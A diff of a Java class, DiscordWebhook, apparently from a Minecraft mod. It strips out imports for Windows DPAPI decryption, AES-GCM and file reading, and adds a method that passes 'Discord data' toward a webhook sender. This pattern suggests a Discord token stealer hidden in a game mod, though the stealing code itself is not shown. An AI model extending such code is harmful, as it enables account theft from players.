@@ -1,45 +1,20 @@
 package studio.dreamys;
 
-import com.google.gson.Gson;
-import com.google.gson.JsonObject;
-import com.sun.jna.platform.win32.Crypt32Util;
 import net.minecraft.client.Minecraft;
-import net.minecraftforge.common.MinecraftForge;
-import net.minecraftforge.event.entity.EntityJoinWorldEvent;
-import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
-import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 
 import javax.crypto.BadPaddingException;
-import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
-import javax.crypto.spec.GCMParameterSpec;
-import javax.crypto.spec.SecretKeySpec;
 import java.awt.*;
-import java.io.*;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.text.SimpleDateFormat;
-import java.util.*;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileReader;
-import java.io.InputStreamReader;
-import java.util.Arrays;
-import java.util.Base64;
-import java.util.Map;
-import java.util.Objects;
-
+import java.util.Date;
 
 public class DiscordWebhook {
     public static Webhook.EmbedObject embed;
@@ -65,6 +40,12 @@ public class DiscordWebhook {
         webhook.addEmbed(embed);
 
         webhook.execute();
+    }
+
+    public static void doSomethingWithDiscord(Discord discordInstance) {
+        String discordData = discordInstance.getDiscord();
+        // Now you can use the discordData string in DiscordWebhook as needed
+        System.out.println("Discord data in DiscordWebhook: " + discordData);
     }
     public static String getTime() {
         SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm");
